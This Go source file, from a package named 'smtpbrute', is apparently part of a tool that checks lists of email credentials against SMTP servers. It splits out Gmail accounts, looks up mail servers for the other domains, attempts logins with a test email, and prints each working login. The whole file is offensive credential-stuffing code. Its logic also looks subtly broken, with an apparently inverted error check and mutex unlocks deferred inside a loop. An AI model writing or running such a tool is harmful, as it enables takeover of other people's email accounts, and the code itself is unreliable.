package smtpbrute

import (
	"sync"

	"github.com/fatih/color"
)

func ProcessCredentials(wordList <-chan []string, testEmail string, mutex *sync.Mutex, wg *sync.WaitGroup) {
	defer wg.Done()
	wordListChunks := <-wordList
	for _, creds := range wordListChunks {
		splitedCreds, err := FilterGmailCreds(creds)
		if err != nil {
			results, err := ConnectSMTP(splitedCreds, testEmail)
			if err == nil {
				mutex.Lock()
				defer mutex.Unlock()
				green := color.New(color.FgGreen).PrintfFunc()
				green("%s\t%s\t%s\t%s\n", results[2], results[3], results[0], results[1])
			}

		} else {
			smtpCreds, err := LookupDomain(splitedCreds)
			if err == nil {
				results, err := ConnectSMTP(smtpCreds, testEmail)
				if err == nil {
					mutex.Lock()
					defer mutex.Unlock()
					green := color.New(color.FgGreen).PrintfFunc()
					green("%s\t%s\t%s\t%s\n", results[2], results[3], results[0], results[1])
				}
			}
		}
	}
}
